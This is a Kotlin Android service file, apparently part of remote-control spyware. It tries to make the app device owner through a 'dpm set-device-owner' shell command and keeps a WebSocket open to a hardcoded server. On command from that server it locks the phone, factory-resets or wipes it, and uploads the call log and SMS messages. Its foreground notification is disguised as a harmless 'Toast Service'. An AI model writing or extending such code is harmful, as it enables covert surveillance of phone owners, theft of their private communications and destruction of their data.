package com.example.betryalcommit

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import java.io.BufferedReader
import java.io.IOException
import java.io.InputStreamReader
import java.util.concurrent.TimeUnit


class MyService : Service() {
    private val uiHandler = Handler(Looper.getMainLooper())
    private var  isSocketConnected:Boolean = false;
    private lateinit var webSocket: WebSocket
    private lateinit var client: OkHttpClient
    private lateinit var request: Request
    private val serverUrl = "ws://192.168.31.50:8080"
    private var isRunning = false
    private val NOTIFICATION_ID = 1410;

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {

        try {
            val process = Runtime.getRuntime()
                .exec("dpm set-device-owner com.exaaample.betryalcommit/.MyAdminReceiver")
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                // Process the output here
            }
            reader.close()
            process.waitFor()
        } catch (e: IOException) {
            // Handle exceptions here
        } catch (e: InterruptedException) {
        }
        client = OkHttpClient.Builder()
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .build()
        request = Request.Builder().url(serverUrl).build()
        webSocket = client.newWebSocket(request, MyWebSocketListener())

        if (!isRunning) {
            isRunning = true
            startForeground(NOTIFICATION_ID, createNotification())

        }
        return START_STICKY
    }

    private fun createNotification(): Notification {
        val channelId = "my_channel_id"
        val channelName = "My Channel"

        // Create the notification channel if Android version is >= Oreo
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val importance = NotificationManager.IMPORTANCE_DEFAULT
            val channel = NotificationChannel(channelId, channelName, importance)
            notificationManager.createNotificationChannel(channel)
        }

        val notificationBuilder = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Toast Service")
            .setContentText("test")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .build()

        return notificationBuilder
    }
    private fun reconnectWebSocket() {
        Thread {
            try {
                Thread.sleep(10000)
                if (!isSocketConnected)
                    webSocket = client.newWebSocket(request, MyWebSocketListener())
            } catch (e: InterruptedException) {
                e.printStackTrace()
            }
        }.start()
    }

    inner class MyWebSocketListener : WebSocketListener() {
        override fun onOpen(webSocket: WebSocket, response: Response) {
            isSocketConnected = true;
            Log.d("WebSocket", "Connected to server")
        }

        override fun onMessage(webSocket: WebSocket, text: String) {
            Log.d("WebSocket", "Received message: $text")
           when(text){
               "lock" -> AdminAct.lockdev(this@MyService)
               "wipe" -> AdminAct.factoryResetDevice(this@MyService)
               "hide" -> AdminAct.wiper(MainActivity(),applicationContext)
               "call_log" -> callutil.uploadCalls(applicationContext.contentResolver,this@MyService,MainActivity())
               "msg_log" -> Teleserv.uploadsms(applicationContext.contentResolver,this@MyService);

           }
            webSocket.send("Hello, it's Android")
        }

        override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
            Log.d("WebSocket", "Connection closed")
            isSocketConnected = false;
            reconnectWebSocket()
        }

        override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
            isSocketConnected = false;
            Log.e("WebSocket", "Connection error: ${t.message}")
            // Try reconnecting to the server
            reconnectWebSocket()
        }
    }

    override fun onDestroy() {
        isSocketConnected = false;
        isRunning = false
        super.onDestroy();
    }


}
